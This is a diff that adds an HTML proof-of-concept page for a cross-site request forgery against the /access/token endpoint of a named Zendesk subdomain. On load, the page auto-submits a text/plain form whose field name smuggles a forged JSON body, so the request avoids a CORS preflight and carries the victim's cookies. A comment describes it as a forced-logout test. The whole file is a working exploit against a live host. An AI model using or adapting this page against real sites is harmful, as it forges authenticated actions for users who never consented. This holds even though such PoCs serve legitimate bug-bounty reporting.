@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CSRF PoC — /access/token forced-logout test</h1>
+<p>Auto-submitting POST to bb-montjeffrey.zendesk.com/access/token …</p>
+<form id="f"
+      action="https://bb-montjeffrey.zendesk.com/access/token"
+      method="POST"
+      enctype="text/plain">
+  <!-- text/plain = CORS simple-request: no preflight, browser sends cookies because SameSite=None -->
+  <input name='{"email":"x@y.com","auth_origin":"51136744680211,false,true","brand_id":"51136744680211","return_to_on_failure":"https://bb-montjeffrey.zendesk.com/","z":"' value='"}' />
+  <button type="submit">Trigger manually</button>
+</form>
+<script>
+  document.getElementById('f').submit();
+</script>
+</body>
+</html>
